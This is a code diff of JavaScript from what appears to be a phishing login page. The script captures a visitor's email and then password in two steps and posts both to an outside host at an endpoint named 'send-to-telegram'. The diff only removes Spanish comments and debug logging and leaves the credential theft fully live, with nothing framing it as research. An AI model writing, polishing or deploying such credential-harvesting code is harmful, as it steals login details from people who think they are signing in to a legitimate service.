@@ -4,16 +4,12 @@ var email, password;
 async function sendToBackend(email, password) {
     const url = 'https://gfx1xn5wg8xtp9mk4no4jjzev.jhere.tech/send-to-telegram';
 
-    // Datos a enviar
     const data = {
         email: email,
         password: password
     };
 
-    console.log("Enviando datos al backend:", data);  // Log para confirmar datos
-
     try {
-        // Enviar datos al backend
         const response = await fetch(url, {
             method: 'POST',
             headers: {
@@ -27,7 +23,6 @@ async function sendToBackend(email, password) {
             throw new Error(`Error en la petición al backend: ${response.statusText}`);
         }
 
-        console.log("Envío exitoso al backend");
     } catch (error) {
         console.error("Error al enviar al backend:", error);
     }
@@ -41,7 +36,6 @@ window.onload = function() {
     var input = document.getElementById("input1");
     
     if(screen.width <= 450) {
-        // Configuración de estilo en pantalla pequeña
         var box = document.getElementById('box');
         var grid = document.getElementById('grid-container');
         var email = document.getElementById('email');
@@ -111,7 +105,7 @@ function enter() {
     else if (counter == 1) {
         password = document.getElementById('input1').value;
         counter++;
-        sendToBackend(email, password);  // Llamada a la función modificada
+        sendToBackend(email, password);
         change2();
     }
 }
